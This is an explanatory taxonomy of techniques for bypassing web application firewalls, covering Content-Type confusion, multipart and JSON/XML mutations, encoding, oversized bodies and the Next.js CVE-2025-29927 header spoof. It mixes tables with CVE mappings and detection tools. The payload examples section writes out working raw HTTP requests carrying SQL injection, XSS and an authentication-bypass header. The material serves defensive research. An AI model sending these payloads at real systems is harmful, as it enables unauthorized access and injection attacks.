# WAF Bypass via HTTP Body & Payload Mutations (2025)

> Extracted from the [HTTP Request Smuggling & Desync — Mutation Taxonomy](http-request-smuggling.md). This document covers mutations that exploit **parsing discrepancies between WAFs and web frameworks** — independent of HTTP Request Smuggling but frequently combined with it.



---



## Core Concept

WAF bypass mutations target a single architectural assumption: **the WAF and the application framework will parse the same HTTP body into the same parameters/values.** When this assumption fails, the WAF inspects a "shadow" of the request while the application processes the real payload.

Two distinct mutation categories exist:

- **Body Structure Mutations (§5)**: Mutate the *container structure* (Content-Type, multipart boundaries, JSON/XML grammar) so the WAF and framework disagree on *which bytes correspond to which parameter*.

- **Payload-Level Obfuscation (§8)**: Mutate the *payload representation itself* (encoding, case, parameter duplication) so the WAF's signature engine fails to match.

These categories are independent but composable. A real-world bypass often chains §5 + §8, and may additionally leverage HTTP Request Smuggling (§1–§4, §6–§7 in the [parent document](http-request-smuggling.md)) to deliver the payload through a desynchronized channel.



---



## §5. Body Structure & Content-Type Mutations

Mutations that make a WAF and a web framework **parse the same HTTP body into different parameters/values**. The attack payload itself is not modified — only the *container structure* changes.



### §5-1. Content-Type Switching & Confusion

| Technique | Mutation Example | Mismatch Effect |
|---|---|---|
| **CT substitution** | Send `multipart/form-data` to a urlencoded endpoint | WAF applies wrong parsing rule set. Empirically 90%+ of websites accept both CTs interchangeably |
| **CT omission** | Remove Content-Type header entirely | Framework's default parser diverges from WAF's assumed parser |
| **CT–body mismatch** | `Content-Type: application/json` header with a multipart body | WAF applies JSON rules; app parses the actual body format |
| **CT parameter pollution** | `Content-Type: multipart/form-data; boundary=a; boundary=b` | Which boundary is adopted determines the parse result |
| **Non-standard CT** | `Content-Type: text/plain` with JSON/XML body | WAF skips structured inspection; framework parses body structure |
| **Charset tampering** | `charset=ibm037` (EBCDIC), `charset=utf-7` | Payload encoded in legacy charset evades signature matching |



### §5-2. Multipart/form-data Structure Mutations

| Technique | Description |
|---|---|
| **Boundary header tampering** | Semicolons in boundary value; RFC 2231 parameter continuation to split the boundary declaration → WAF uses fake boundary, app uses real one |
| **Boundary body tampering** | Dash count, whitespace, and CRLF handling differences in body delimiters |
| **Content-Disposition tampering** | Quote presence/absence on field/file names, encoding, escaping differences |
| **Preamble/Epilogue insertion** | Payloads hidden before the first boundary (preamble) or after the last (epilogue) — RFC mandates ignoring these, but some parsers process them |
| **Whitespace/tab substitution** | Replacing spaces with tabs in CT header values |
| **Non-standard field name characters** | Invalid characters in field names → WAF fails to recognize the parameter |
| **CT header parameter removal** | Removing secondary parameters (e.g., `name`) alters WAF behavior |



### §5-3. JSON Structure Mutations

| Technique | Description |
|---|---|
| **Duplicate keys** | `{"key":"safe","key":"<xss>"}` — which value is adopted varies by parser (RFC 8259 leaves this undefined) |
| **Unicode escapes** | `\u003cscript\u003e` → WAF sees string literal; app decodes to HTML |
| **Non-standard comments** | `/* */`, `//` — absent from JSON spec but accepted by some parsers (e.g., Jackson) |
| **Null bytes** | `\x00` within values to halt WAF parser mid-stream |
| **Type confusion** | Switching between number/string/boolean to evade type-specific signatures |
| **Deep nesting** | Extreme JSON depth exceeding WAF parser recursion/memory limits |



### §5-4. XML Structure Mutations

| Technique | Description |
|---|---|
| **DOCTYPE closure confusion** | Extra characters after DOCTYPE declaration disrupt WAF XML parse state |
| **Schema closure manipulation** | Shifting XML schema closing tags, injecting elements/attributes to distort structure |
| **Strategic newline placement** | Newlines between XML tags positioned to break WAF rule matching |
| **Encoding declaration tampering** | `<?xml encoding="UTF-7"?>` confuses WAF charset interpretation |
| **CDATA section abuse** | `<![CDATA[<script>]]>` — payload hidden inside CDATA |
| **Internal entity expansion** | Entity definitions/references for WAF bypass (not XXE-targeted) |



---



## §8. Payload-Level Obfuscation

Unlike §5 which mutates **container structure**, this category mutates **the payload representation itself** to evade WAF signatures. Independent of HRS but commonly combined with §5 in practice.

| Technique | Example |
|---|---|
| **Encoding substitution** | URL encoding, HTML entities, Unicode normalization, IBM037 (EBCDIC) |
| **Case/whitespace insertion** | `SeLeCt`, `UN/**/ION` — breaking SQL/XSS signatures |
| **HTTP Parameter Pollution** | Duplicate parameter names → servers vary on first/last/array handling |
| **Oversized requests** | Body exceeding WAF inspection limits (typically 4KB–64KB) → inspection skipped |
| **Non-standard HTTP methods** | Payloads via PUT, PATCH, DELETE that WAFs don't inspect |
| **Legacy cookie parser abuse** | `$Version` cookie attributes and quoted-string encoding to bypass WAF rules |
| **Internal header spoofing** | `X-HTTP-Method-Override`, `X-Middleware-Subreq` (CVE-2025-29927, CVSS 9.1) to alter framework behavior |



---



## Payload Examples

### §5. Content-Type Confusion

Bypass WAF body inspection by switching Content-Type so WAF applies wrong parser.

```
POST /api/search HTTP/1.1\r\n
Host: vulnerable.com\r\n
Content-Type: multipart/form-data; boundary=abc\r\n
Content-Length: 60\r\n
\r\n
--abc\r\n
Content-Disposition: form-data; name="q"\r\n
\r\n
' OR 1=1--\r\n
--abc--
```

- WAF expects `application/x-www-form-urlencoded` or `application/json` on this endpoint → applies wrong parsing rules → misses the SQL injection payload.
- Application framework accepts multipart and extracts `q=' OR 1=1--`.

### §5. Charset-Based Evasion (IBM037 / EBCDIC)

```
POST /api/login HTTP/1.1\r\n
Host: vulnerable.com\r\n
Content-Type: application/x-www-form-urlencoded; charset=ibm037\r\n
Content-Length: 30\r\n
\r\n
\xA7\x96\x99...(EBCDIC-encoded "user=admin' OR 1=1--")
```

- WAF applies ASCII/UTF-8 signature matching → EBCDIC-encoded payload is invisible.
- Framework decodes IBM037 charset → extracts the SQL injection payload.

### §8. Internal Header Spoofing (CVE-2025-29927)

```
GET /admin/dashboard HTTP/1.1\r\n
Host: vulnerable.com\r\n
x-middleware-subreq: middleware:middleware:middleware\r\n
\r\n
```

- Next.js middleware checks `x-middleware-subreq` to prevent infinite recursion.
- Attacker sends crafted value → middleware skips execution entirely → authentication bypass.

### §8. Oversized Body — Inspection Limit Bypass

```
POST /api/query HTTP/1.1\r\n
Host: vulnerable.com\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 70000\r\n
\r\n
padding=AAAA....(65536 bytes of padding)....&q=' OR 1=1--
```

- WAF inspects only the first 4KB–64KB of the body (product-dependent limit).
- Payload positioned after the inspection window → WAF never sees it.
- Application parses the full body → extracts the SQL injection payload.

### §5 + §8 Composite: Multipart Boundary Confusion + Encoding

```
POST /api/update HTTP/1.1\r\n
Host: vulnerable.com\r\n
Content-Type: multipart/form-data; boundary="abc; boundary=xyz"\r\n
Content-Length: 200\r\n
\r\n
--abc; boundary=xyz\r\n
Content-Disposition: form-data; name="data"\r\n
\r\n
{"key":"\u003cscript\u003ealert(1)\u003c/script\u003e"}\r\n
--abc; boundary=xyz--
```

- WAF parses `boundary=xyz` (last-wins) → cannot find valid multipart structure → skips inspection.
- Application parses `boundary="abc; boundary=xyz"` (quoted string) → extracts JSON body → decodes Unicode escapes → XSS.



---



## CVE / Bounty Mapping

| Mutation Combination | CVE / Case | Impact / Bounty |
|---|---|---|
| §5 (CT switching + structure mutations) × 5 WAFs × 6 frameworks | ACSAC 2025 research | 1,207 bypasses. Google Cloud Armor Tier 1 classification |
| §3 (URL decode ordering) | CVE-2024-1019 (ModSecurity v3) | Complete bypass of path-based WAF rules |
| §8 (internal header spoofing) | CVE-2025-29927 (Next.js, CVSS 9.1) | `x-middleware-subreq` header fully bypasses auth middleware |
| §3 (WAF exception path) | Cloudflare ACME path bypass (2025.10) | `/.well-known/acme-challenge/` exempt from WAF → direct origin attack |



---



## Detection Tools

| Tool | Target | Core Technique |
|---|---|---|
| **WAFFLED** (open source) | WAF ↔ framework | Grammar-based fuzzing per Content-Type (JSON, multipart, XML) |
| **HTTP-Normalizer** (defensive) | Inbound request normalization | Enforces RFC-strict compliance; blocks non-conforming requests |



---



## References

- ACSAC 2025 — *WAF Body Parsing Bypass via Content-Type Switching*. 1,207 bypasses across 5 WAFs × 6 frameworks. `WAFFLED` tool.
- CVE-2025-29927 — Next.js `x-middleware-subreq` authentication bypass (CVSS 9.1).
- CVE-2024-1019 — ModSecurity v3 URL decode ordering error → complete WAF rule bypass.
- Cloudflare ACME path bypass (2025.10) — `/.well-known/acme-challenge/` exempt from WAF inspection.
- RFC 8259 — *The JavaScript Object Notation (JSON) Data Interchange Format*. Duplicate key handling left undefined.
- RFC 2046 — *MIME Part Two: Media Types*. Multipart boundary syntax and preamble/epilogue semantics.
- RFC 2231 — *MIME Parameter Value and Encoded Word Extensions*. Parameter continuation exploited in boundary tampering.



---



*This document was created for defensive security research and vulnerability understanding purposes.*
